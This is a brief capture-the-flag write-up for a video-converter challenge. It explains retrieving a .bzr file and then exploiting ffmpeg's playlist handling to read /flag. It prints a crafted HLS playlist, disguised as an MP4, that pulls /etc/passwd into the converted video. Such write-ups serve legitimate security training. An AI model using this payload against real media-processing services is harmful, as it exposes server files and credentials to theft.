# VIDEO BAZAR
# DESCRIPTION
HI I WAS RECENTLY LEARNING ABOUT THE DIFFERENT TYPES OF VIDEOS THERE COULD BE
AND DECIDED TO MAKE A BASIC LEVEL VIDEO CONVERTER CAN U FIND ANY ERRORRS IN IT
THANKS

# SHORT WRITEUP
THE FIRST PART IS BASIC .bzr file retrival using any tool 
the second part is exploiting ssrf via ffmpeg to read /flag file to a video
and download it before it gets deleted

# mp4->avi
Inside Mp4 file contnet 
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST```


### FLAG IS IN `/flag`

